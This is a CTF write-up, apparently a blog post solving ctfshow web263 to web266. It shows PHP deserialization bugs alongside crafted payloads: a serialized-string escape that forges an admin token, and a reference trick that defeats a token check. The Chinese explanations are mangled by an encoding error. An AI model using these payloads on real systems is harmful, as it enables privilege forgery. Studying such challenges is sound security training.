class="hljs-variable">$umsg</span>;<br><br></code></pre></td></tr></table></figure><p>è§‚å¯Ÿç»“æœ,è½¬æ¢å‰$toçš„å€¼åº”è¯¥ä¸º<code>s:31:&quot;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;</code>æ­£å¥½31ä¸ªå­—ç¬¦,è½¬æ¢åä¼šå¤šä¸€ä¸ªå­—ç¬¦,è¿™æ—¶å€™$toçš„å€¼ä¸º<code>s:31:&quot;loveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&quot;</code>åé¢çš„}é€ƒé€¸å‡ºæ¥äº†</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">å‰:<br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;from&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;msg&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;2&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;to&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;fuck&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;&#125;&quot;;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;&#125;<br>å:<br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;from&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;msg&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;2&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;to&quot;</span>;s:<span class="hljs-number">31</span>:<span class="hljs-string">&quot;loveU&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;&#125;&quot;;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™æ—¶å€™è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å®é™…æ¥æ”¶çš„å€¼åº”è¯¥ä¸º<code>&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:31:&quot;loveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&quot;&#125;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code>(åŒå¼•å·å‰ç§»ä¸€ä½)</p><p>â€œ;s:5:â€tokenâ€;s:5:â€adminâ€;}çš„é•¿åº¦ä¸º27,è¦è®©å®ƒé€ƒé€¸å‡ºæ¥,è¦è½¬æ¢27æ¬¡æ‰è¡Œ,æˆ‘ä»¬æ„é€ ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);<br><span class="hljs-variable">$umsg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$umsg</span>));<br></code></pre></td></tr></table></figure><p>è½¬æ¢å‰<code>s:135:&quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;</code>æ­£å¥½135ä½<br>è½¬æ¢å<code>s:135:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU</code>ä¹Ÿæ­£å¥½135ä½,åé¢çš„27ä½å­—ç¬¦â€;s:5:â€tokenâ€;s:5:â€adminâ€;}é€ƒé€¸å‡ºæ¥äº†,ç¬¬ä¸€ä¸ªå­—ç¬¦â€ä¼šè¡¥ä¸Šå»é—­åˆ$to</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">å‰:<br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;from&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;msg&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;2&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;to&quot;</span>;s:<span class="hljs-number">135</span>:<span class="hljs-string">&quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;&#125;&quot;;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;&#125;<br>å:<br>O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;from&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;msg&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;2&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;to&quot;</span>;s:<span class="hljs-number">135</span>:<span class="hljs-string">&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;&#125;&quot;;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;token&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure><p>æœ€åååºåˆ—åŒ–æ—¶æ¥æ”¶çš„å€¼åˆ°äº†<code>&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:135:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>å·²ç»ç»“æŸäº†,ç”¨}é—­åˆäº†,åé¢æ‹¼æ¥çš„â€;s:5:â€tokenâ€;s:4:â€userâ€;}ä¸æ˜¯ååºåˆ—åŒ–çš„æ ¼å¼,æ‰€ä»¥ç›´æ¥è¢«å¿½ç•¥äº†,è¿™æ—¶å€™é€šè¿‡ååºåˆ—åŒ–å°±æˆåŠŸæŠŠtokençš„å€¼æ”¹æˆadminäº†</p><p>åœ¨index.phpé¡µé¢ä¼ å…¥,å¸¦ç€cookieå»è®¿é—®message.php,æ‹¿åˆ°flag</p><h2 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-variable">$m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>];<br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$f</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$t</span>))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span>);<br>    <span class="hljs-variable">$umsg</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>));<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$umsg</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your message has been sent&#x27;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>message.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;user&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]));<span class="hljs-comment">//sessionä¸­å–message</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>éœ€è¦<code>$token=&#39;admin&#39;;</code>ç»è¿‡åºåˆ—åŒ–æ˜¯è¿™æ ·çš„<code>s:5:&quot;token&quot;;s:5:&quot;admin&quot;;</code>ï¼ŒåŠ ä¸Šé—­åˆ<code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>ä¸€å…±27ä¸ªå­—ç¬¦ï¼Œæ¯æ¬¡æ›¿æ¢å¢åŠ ä¸€ä¸ªå­—ç¬¦ï¼Œéœ€è¦27ä¸ªfuckåƒæ‰æ„é€ å‡½æ•°çš„$token&#x3D;â€™userâ€™;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>,<span class="hljs-string">&#x27;loveU&#x27;</span>,<span class="hljs-variable">$msg</span>);<br>&#125;<br><br><span class="hljs-variable">$msg</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);<br><span class="hljs-variable">$msg_u</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>);<br><span class="hljs-variable">$msg_1</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$msg_u</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg_1</span>;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">?f=a<span class="hljs-variable">&amp;m</span>=b<span class="hljs-variable">&amp;t</span>=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>admin<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>åœ¨message.phpä¸­Cookie:<code>msg=12</code></p><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowAdmin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$t</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;token===<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$ctfshow</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctfshow&#x27;</span>]);<br><span class="hljs-variable">$ctfshow</span>-&gt;token=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctfshow</span>-&gt;<span class="hljs-title function_ invoke__">login</span>())&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>åªèƒ½æ”¹å˜passwordçš„å€¼ï¼Œå› ä¸ºtokenä¸‹é¢æœ‰èµ‹å€¼ï¼Œè¦è®©$this-&gt;token&#x3D;&#x3D;&#x3D;$this-&gt;passwordï¼Œå¯ä»¥ç”¨å¼•ç”¨ç±»å‹$this-&gt;password &#x3D; &amp;$this-&gt;token;ï¼Œ&amp;å’Œcè¯­è¨€æŒ‡é’ˆç±»ä¼¼ï¼Œå–åœ°å€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowAdmin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$p</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$t</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = &amp;<span class="hljs-variable language_">$this</span>-&gt;token;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshowAdmin</span>())<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>tfshow=<span class="hljs-symbol">O:</span><span class="hljs-number">12</span><span class="hljs-symbol">:<span class="hljs-string">&quot;ctfshowAdmin&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">5</span><span class="hljs-symbol">:<span class="hljs-string">&quot;token&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">0</span><span class="hljs-symbol">:<span class="hljs-string">&quot;&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">8</span><span class="hljs-symbol">:<span class="hljs-string">&quot;password&quot;</span></span>;<span class="hljs-symbol">R:</span><span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$cs</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span 